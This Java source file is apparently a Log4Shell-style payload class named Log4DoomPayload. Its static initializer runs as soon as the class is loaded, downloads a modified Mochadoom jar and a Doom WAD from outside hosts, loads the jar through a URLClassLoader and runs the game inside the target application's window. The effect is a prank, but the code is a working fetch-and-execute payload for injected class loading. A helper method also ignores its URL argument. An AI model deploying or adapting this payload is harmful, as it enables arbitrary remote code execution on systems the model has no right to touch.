import java.awt.Frame;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import javax.swing.JFrame;

public class Log4DoomPayload {
	public static final String MOCHADOOM_MODIFIED_SOURCE = "https://jenkins.novauniverse.net/job/mochadoom-modified/lastBuild/net.zeeraa.mochadoom$MochadoomModified/artifact/net.zeeraa.mochadoom/MochadoomModified/0.0.1-SNAPSHOT/MochadoomModified-0.0.1-SNAPSHOT.jar";
	public static final String WAD_SOURCE = "https://ia600609.us.archive.org/16/items/DoomsharewareEpisode/doom.ZIP";

	public static final String ENGINE_CLASS = "net.zeeraa.mochadoom.Engine";
	public static final String DOOM_MAIN_CLASS = "net.zeeraa.mochadoom.doom.DoomMain";

	static {
		System.out.println("Starting Log4Doom payload");
		try {
			run();
		} catch (Exception e) {
			e.printStackTrace();
			System.err.println("Failed to set up log4doom. " + e.getClass().getName() + " " + e.getMessage());
		}
	}

	private static void run() throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchMethodException, SecurityException, NoSuchFieldException {
		List<JFrame> runningFrames = new ArrayList<>();

		for (Frame f : JFrame.getFrames()) {
			if (f instanceof JFrame) {
				runningFrames.add((JFrame) f);
			}
		}

		if (runningFrames.size() == 0) {
			System.err.println("No running jframes found");
			return;
		}

		JFrame frameToUse = null;

		if (runningFrames.size() == 1) {
			System.out.println("Using first frame since there there was only 1 jframe found");
			frameToUse = runningFrames.get(0);
		} else {
			System.out.println("Using first visible frame or first since there where multiple jframes found");
			frameToUse = runningFrames.stream().filter(JFrame::isVisible).findFirst().orElse(runningFrames.get(0));
		}

		System.out.println("Found " + runningFrames.size() + " jframes");

		File tempFile = Files.createTempDirectory("jog4doom_assets").toFile();
		System.out.println("Using path " + tempFile.getAbsolutePath() + " for storing data");
		tempFile.deleteOnExit();

		System.out.println("Doawnloading DOOM1.WAD");
		File wadFile = downloadDoom(MOCHADOOM_MODIFIED_SOURCE, tempFile);
		wadFile.deleteOnExit();
		System.out.println("DOOM1.WAD downloaded to " + wadFile.getAbsolutePath());

		System.out.println("Downloading modified Mochadoom");
		File mochadoomJar = new File(tempFile.getAbsolutePath() + File.separator + "MochadoomModified.jar");
		downloadFile(MOCHADOOM_MODIFIED_SOURCE, mochadoomJar.getAbsolutePath());
		System.out.println("MochadoomModified downloaded to " + mochadoomJar.getAbsolutePath());
		mochadoomJar.deleteOnExit();

		URL jarUrl = mochadoomJar.toURI().toURL();
		System.out.println("Creating URLClassLoader with url: " + jarUrl.toString());
		URLClassLoader classLoader = new URLClassLoader(new URL[] { jarUrl });

		Class<?> doomEngineClass = classLoader.loadClass(ENGINE_CLASS);
		System.out.println("Doom engine class: " + doomEngineClass.getName());

		String[] doomArgs = new String[] {
				"-iwad",
				wadFile.getAbsolutePath()
		};

		System.out.println("Starting Mochadoom");
		Object engine = doomEngineClass.getConstructor(JFrame.class, String[].class).newInstance(frameToUse, doomArgs);
		System.out.println("Engine initialized. " + engine.getClass().getName());

		System.out.println("Fetching field DOOM in Engine");
		Field doomField = doomEngineClass.getDeclaredField("DOOM");

		Class<?> doomMainClass = classLoader.loadClass(DOOM_MAIN_CLASS);
		System.out.println("Getting instance of " + doomMainClass.getName());
		Object doomMain = doomField.get(engine);

		System.out.println("Fetching method setupLoop() from DoomMain");
		Method setupLoopMethod = doomMainClass.getDeclaredMethod("setupLoop");

		System.out.println("Engine initialized. Calling setupLoop on " + doomMainClass.getName());
		setupLoopMethod.invoke(doomMain);

		classLoader.close();
	}

	public static final File downloadDoom(String zipFileUrl, File outputDirectory) throws IOException {
		File tmpFile = new File(outputDirectory.getAbsolutePath() + File.separator + "tmp.zip");
		tmpFile.deleteOnExit();
		downloadFile(WAD_SOURCE, tmpFile.getAbsolutePath());
		ZipFile zipFile = new ZipFile(tmpFile);
		ZipEntry entry = zipFile.getEntry("DOOM1.WAD");

		File outputFile = new File(outputDirectory.getAbsolutePath() + File.separator + "DOOM1.WAD");

		InputStream inputStream = zipFile.getInputStream(entry);
		OutputStream outputStream = new FileOutputStream(outputFile);
		byte[] buffer = new byte[1024];
		int bytesRead;
		while ((bytesRead = inputStream.read(buffer)) != -1) {
			outputStream.write(buffer, 0, bytesRead);
		}

		outputStream.close();
		zipFile.close();
		tmpFile.delete();

		return outputFile;
	}

	public static final void downloadFile(String fileUrl, String savePath) throws FileNotFoundException, IOException {
		URL url = new URL(fileUrl);

		BufferedInputStream in = new BufferedInputStream(url.openStream());
		FileOutputStream fileOutputStream = new FileOutputStream(savePath);

		byte[] dataBuffer = new byte[1024];
		int bytesRead;
		while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
			fileOutputStream.write(dataBuffer, 0, bytesRead);
		}

		in.close();
		fileOutputStream.close();
	}
}
